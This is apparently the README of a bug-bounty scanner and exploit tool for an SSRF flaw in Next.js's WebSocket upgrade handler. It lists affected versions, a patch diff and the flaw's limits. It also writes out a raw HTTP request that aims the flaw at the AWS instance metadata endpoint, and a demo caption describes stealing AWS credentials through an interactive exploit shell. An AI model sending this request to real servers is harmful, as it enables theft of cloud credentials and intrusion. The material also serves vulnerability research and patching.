# NEXT-SSRF
SSRF — CVE-2026-44578 Scanner &amp; Exploit ║ ║ Next.js WebSocket Upgrade Handler SSRF

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║         NextSSRF — CVE-2026-44578 Scanner & Exploit          ║
║   Next.js WebSocket Upgrade Handler SSRF                     ║
║   Affected: 13.4.13 → 15.5.15, 16.0.0 → 16.2.4              ║
║         @mitsec / ynsmroztas — Bug Bounty Tooling            ║
╚══════════════════════════════════════════════════════════════╝
```

![Python](https://img.shields.io/badge/python-3.10+-blue?style=flat-square&logo=python)
![CVE](https://img.shields.io/badge/CVE-2026--44578-red?style=flat-square)
![CVSS](https://img.shields.io/badge/CVSS-8.6_High-orange?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20Android-lightgrey?style=flat-square)

**CVE-2026-44578** — Server-Side Request Forgery via Next.js WebSocket Upgrade Handler

[Overview](#overview) · [Install](#install) · [Usage](#usage) · [Pipeline](#pipeline) · [Shodan](#shodan) · [Interactive](#interactive-shell) · [Disclaimer](#disclaimer)

</div>

---

## Overview

On May 11, 2026, Vercel patched **CVE-2026-44578** (CVSS 8.6): an unauthenticated SSRF in Next.js's WebSocket upgrade handler affecting all self-hosted deployments from **13.4.13** onward.

### Mechanism

```
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1   ← absolute-form URI
Host: vulnerable-nextjs.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

The `//` in `http://` triggers `normalizeRepeatedSlashes` early-exit, setting `statusCode: 308` and `finished: true`. The vulnerable upgrade handler **ignores both flags** and calls `proxyRequest` when `parsedUrl.protocol` is truthy — proxying the request to the attacker-controlled host on **port 80**.

```diff
// router-server.ts (vulnerable)
- if (parsedUrl.protocol) {
-     return await proxyRequest(req, socket, parsedUrl, head)
+ if (finished && parsedUrl.protocol) {
+     if (!statusCode) {
+         return await proxyRequest(req, socket, parsedUrl, head)
```

### Affected Versions

| Product         | Vulnerable         | Fixed    |
|-----------------|--------------------|----------|
| Next.js         | 13.4.13 – 15.5.15  | 15.5.16  |
| Next.js         | 16.0.0 – 16.2.4    | 16.2.5   |
| Vercel-hosted   | ✅ NOT affected     | N/A      |

### Limitations

- **GET only** (no POST/PUT)
- **Port 80 only** (explicit ports stripped by URL normalization)
- AWS **IMDSv2** not exploitable (requires PUT token)
- GCP metadata rejects `Upgrade: websocket` with 400
- Reverse proxies (nginx/caddy/HAProxy) block absolute-form URIs

---

## Demo

![NextSSRF — AWS Credentials Exfiltrated](nextssrf.jpg)

> AWS IMDSv1 credentials exfiltrated via CVE-2026-44578 — interactive exploit shell

---
